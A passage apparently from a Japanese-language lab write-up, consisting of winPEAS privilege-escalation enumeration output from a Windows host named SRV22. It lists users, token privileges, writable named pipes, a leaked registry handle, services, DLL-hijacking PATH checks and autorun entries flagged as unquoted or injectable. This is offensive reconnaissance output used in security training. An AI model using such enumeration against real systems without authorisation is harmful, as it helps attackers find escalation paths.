ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Local Group Policy settings - local users/machine

ÉÍÍÍÍÍÍÍÍÍÍ¹ Potential GPO abuse vectors (applied domain GPOs writable by current user)
  [-] Controlled exception, info about OSCP\<username> not found
    No obvious GPO abuse via writable SYSVOL paths or GPCO membership detected.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Printers (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  eventlog                                                                                             Everyone [Allow: WriteData/CreateFiles]                                O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  ROUTER                                                                                               Everyone [Allow: WriteData/CreateFiles]                                O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)

  vgauth-service                                                                                       Everyone [Allow: WriteData/CreateFiles]                                O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
```

### イベント情報

```powershell
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting Events information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials

      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Account Logon Events (4624) for the last 10 days.

      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Process creation events - searching logs (EID 4688) for sensitive data.

      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.

  [X] Exception: Attempted to perform an unauthorized operation.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Displaying Power off/on events for last 5 days

System.UnauthorizedAccessException: Attempted to perform an unauthorized operation.
   at System.Diagnostics.Eventing.Reader.EventLogException.Throw(Int32 errorCode)
   at System.Diagnostics.Eventing.Reader.NativeWrapper.EvtQuery(EventLogHandle session, String path, String query, Int32 flags)
   at System.Diagnostics.Eventing.Reader.EventLogReader..ctor(EventLogQuery eventQuery, EventBookmark bookmark)
   at winPEAS.Helpers.MyUtils.GetEventLogReader(String path, String query, String computerName)
   at winPEAS.Info.EventsInfo.Power.Power.<GetPowerEventInfos>d__0.MoveNext()
   at winPEAS.Checks.EventsInfo.PowerOnEvents()


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
È Check if you have some admin equivalent privileges https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups
  [X] Exception: Object reference not set to an instance of an object.
  Current user: <username>
  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Network, Authenticated Users, This Organization, NTLM Authentication
   =================================================================================================

    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time
   Current User   :     OSCP\<username>
   Idle Time      :     02h:55m:07s:671ms

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
È Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text

ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
   Computer Name           :   SRV22
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   1/9/2026 7:05:25 PM
   Logons Count            :   27
   Password Last Set       :   10/9/2024 12:09:27 PM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed by the system.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   jenkins
   User Id                 :   1000
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   
   Last Logon              :   11/13/2024 2:23:46 AM
   Logons Count            :   6
   Password Last Set       :   10/9/2024 12:23:12 PM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   WDAGUtilityAccount
   User Id                 :   504
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/9/2024 2:16:19 PM

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\<username> : <username> [Allow: AllAccess]
    C:\Users\Default
    C:\Users\Default User
    C:\Users\jenkins
    C:\Users\Public

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
È Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: SRV22
    SID: S-1-5-21-1151949782-2971075788-3621847170
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 1.00:00:00
    MinPasswordLength: 7
    PasswordHistoryLength: 24
    PasswordProperties: 0
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Print Logon Sessions


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Processes Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Processes -non Microsoft-
È Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Vulnerable Leaked Handlers
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#leaked-handlers
È Getting Leaked Handlers, it might take some time...
[#########-]  97% |                       Handle: 2116(key)
    Handle Owner: Pid is 316(winPEASx64) with owner: <username>
    Reason: AllAccess
    Registry: HKLM\software\microsoft\windows\currentversion\explorer\folderdescriptions\{1ac14e77-02e7-4e5d-b744-2eb1ae5198b7}\propertybag
   =================================================================================================



ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
  [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
  [X] Exception: Access denied 
    @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver(PMC-Sierra, Inc. - @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver)[System32\drivers\arcsas.sys] - Boot
   =================================================================================================

    @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD(QLogic Corporation - @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD)[System32\drivers\bxvbda.sys] - Boot
   =================================================================================================

    @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service(Windows (R) Win 7 DDK provider - @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service)[C:\Windows\System32\drivers\bcmfn2.sys] - System
   =================================================================================================

    @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver(QLogic Corporation - @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver)[System32\drivers\bxfcoe.sys] - Boot
   =================================================================================================

    @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver(QLogic Corporation - @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver)[System32\drivers\bxois.sys] - Boot
   =================================================================================================

    @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver(Chelsio Communications - @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver)[C:\Windows\System32\drivers\cht4vx64.sys] - System
   =================================================================================================

    @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I(Intel Corporation - @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I)[C:\Windows\System32\drivers\e1i63x64.sys] - System
   =================================================================================================

    @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD(QLogic Corporation - @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD)[System32\drivers\evbda.sys] - Boot
   =================================================================================================

    @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver(Intel Corporation - @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_GPIO.sys] - System
   =================================================================================================

    @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver(Intel Corporation - @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_I2C.sys] - System
   =================================================================================================

    @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller(Intel Corporation - @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller)[System32\drivers\iaStorAVC.sys] - Boot
   =================================================================================================

    @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7(Intel Corporation - @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7)[System32\drivers\iaStorV.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver)(Mellanox - @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver))[C:\Windows\System32\drivers\ibbus.sys] - System
   =================================================================================================

    Jenkins(Jenkins)["C:\Program Files\Jenkins\jenkins.exe"] - Autoload
    Jenkins Automation Server
   =================================================================================================

    @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator(Mellanox - @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator)[C:\Windows\System32\drivers\mlx4_bus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service(Mellanox - @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service)[C:\Windows\System32\drivers\ndfltr.sys] - System
   =================================================================================================

    @oem5.inf,%pvscsi.DiskName%;pvscsi Storage Controller Driver(VMware, Inc. - @oem5.inf,%pvscsi.DiskName%;pvscsi Storage Controller Driver)[System32\drivers\pvscsi.sys] - Boot
   =================================================================================================

    @netqevbda.inf,%vbd_srv_desc%;QLogic FastLinQ Ethernet VBD(Cavium, Inc. - @netqevbda.inf,%vbd_srv_desc%;QLogic FastLinQ Ethernet VBD)[System32\drivers\qevbda.sys] - Boot
   =================================================================================================

    @qefcoe.inf,%QEFCOE.SVCDESC%;QLogic FCoE driver(Cavium, Inc. - @qefcoe.inf,%QEFCOE.SVCDESC%;QLogic FCoE driver)[System32\drivers\qefcoe.sys] - Boot
   =================================================================================================

    @qeois.inf,%QEOIS.SVCDESC%;QLogic 40G iSCSI Driver(QLogic Corporation - @qeois.inf,%QEOIS.SVCDESC%;QLogic 40G iSCSI Driver)[System32\drivers\qeois.sys] - Boot
   =================================================================================================

    @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64))[System32\drivers\ql2300i.sys] - Boot
   =================================================================================================

    @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver(QLogic Corporation - @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver)[System32\drivers\ql40xx2i.sys] - Boot
   =================================================================================================

    @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64))[System32\drivers\qlfcoei.sys] - Boot
   =================================================================================================

    @%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe,-1001(@%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe,-1001)["C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"] - System
    @%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe,-1002
   =================================================================================================

    OpenSSH Authentication Agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Manual
    Agent to hold private keys used for public key authentication.
   =================================================================================================

    @usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver(@usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver)[C:\Windows\System32\drivers\USBSTOR.SYS] - System
   =================================================================================================

    @usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller(@usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller)[C:\Windows\System32\drivers\USBXHCI.SYS] - System
   =================================================================================================

    VMware Alias Manager and Ticket Service(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Autoload
    Alias Manager and Ticket Service
   =================================================================================================

    @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service(VMware, Inc. - @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Autoload
    @oem8.inf,%VM3DSERVICE_DESCRIPTION%;Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================

    @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver(VMware, Inc. - @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver)[System32\drivers\vmci.sys] - Boot
   =================================================================================================

    VMware Host Guest Client Redirector(VMware, Inc. - VMware Host Guest Client Redirector)[system32\DRIVERS\vmhgfs.sys] - System
    Implements the VMware HGFS protocol. This protocol provides connectivity to host files provided by the HGFS server.
   =================================================================================================

    Memory Control Driver(VMware, Inc. - Memory Control Driver)[C:\Windows\system32\DRIVERS\vmmemctl.sys] - Autoload
    Driver to provide enhanced memory management of this virtual machine.
   =================================================================================================

    @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device(VMware, Inc. - @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device)[C:\Windows\System32\drivers\vmmouse.sys] - System
   =================================================================================================

    VMware Physical Disk Helper(VMware, Inc. - VMware Physical Disk Helper)[C:\Windows\system32\DRIVERS\vmrawdsk.sys] - System
    VMware Physical Disk Helper
   =================================================================================================

    VMware Tools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Autoload
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================

    @oem6.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device(VMware, Inc. - @oem6.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device)[C:\Windows\System32\drivers\vmusbmouse.sys] - System
   =================================================================================================

    @oem4.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver(VMware, Inc. - @oem4.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver)[C:\Windows\System32\drivers\vmxnet3.sys] - System
   =================================================================================================

    vnetWFP(VMware, Inc. - vnetWFP)[C:\Windows\system32\DRIVERS\vnetWFP.sys] - System
    Guest Introspection Network Filter Driver
   =================================================================================================

    vsepflt(VMware, Inc. - vsepflt)[system32\DRIVERS\vsepflt.sys] - Boot
    Guest Introspection Driver
   =================================================================================================

    vSockets Virtual Machine Communication Interface Sockets driver(VMware, Inc. - vSockets Virtual Machine Communication Interface Sockets driver)[system32\DRIVERS\vsock.sys] - Boot
    vSockets Driver
   =================================================================================================

    @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver(VIA Corporation - @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver)[System32\drivers\vstxraid.sys] - Boot
   =================================================================================================

    @%SystemRoot%\System32\drivers\vwifibus.sys,-257(@%SystemRoot%\System32\drivers\vwifibus.sys,-257)[C:\Windows\System32\drivers\vwifibus.sys] - System
    @%SystemRoot%\System32\drivers\vwifibus.sys,-258
   =================================================================================================

    @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service(Mellanox - @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service)[C:\Windows\System32\drivers\winmad.sys] - System
   =================================================================================================

    @winusb.inf,%WINUSB_SvcName%;WinUsb Driver(@winusb.inf,%WINUSB_SvcName%;WinUsb Driver)[C:\Windows\System32\drivers\WinUSB.SYS] - System
    @winusb.inf,%WINUSB_SvcDesc%;Generic driver for USB devices
   =================================================================================================

    @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service(Mellanox - @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service)[C:\Windows\System32\drivers\winverbs.sys] - System
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Modifiable Services
È Check if you can modify any service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    You cannot modify any service

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking if you can modify any service registry
È Check if you can modify the registry of a service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services-registry-modify-permissions
    [-] Looks like you cannot change the registry of any service...

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking write permissions in PATH folders (DLL Hijacking)
È Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking
    C:\Program Files\Common Files\Oracle\Java\javapath
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Applications Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications --Via Program Files/Uninstall registry--
È Check if you can modify installed software https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\internet explorer
    C:\Program Files\Java
    C:\Program Files\Jenkins
    C:\Program Files\msedge_installer.log
    C:\Program Files\MsEdgeCrashpad
    C:\Program Files\PackageManagement
    C:\Program Files\Uninstall Information
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\windows nt
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


ÉÍÍÍÍÍÍÍÍÍÍ¹ Autorun Applications
È Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html
Error getting autoruns from WMIC: System.Management.ManagementException: Access denied 
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at winPEAS.Info.ApplicationInfo.AutoRuns.GetAutoRunsWMIC()

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


